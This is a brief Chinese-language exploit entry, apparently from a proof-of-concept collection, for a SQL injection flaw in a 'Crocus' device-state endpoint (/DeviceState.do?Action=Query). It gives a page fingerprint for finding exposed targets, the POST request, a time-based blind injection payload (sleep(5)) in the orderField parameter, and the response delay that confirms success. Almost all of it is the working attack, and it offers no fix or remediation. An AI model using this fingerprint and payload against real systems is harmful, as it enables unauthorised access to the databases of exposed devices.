# Crocusdevicestatesql注入漏洞

Crocusdevicestatesql ｜ SQL注入 ｜ —
- **指纹**：`body="window.registerLogin.changeAuthCode"`
- **请求**：`POST /DeviceState.do?Action=Query HTTP/1.1`

**Payload**
```
PageSize=1&PageIndex=0&orderField=(select*from(select%20sleep(5))a)
```
- **响应特征**：200 响应时间>=5s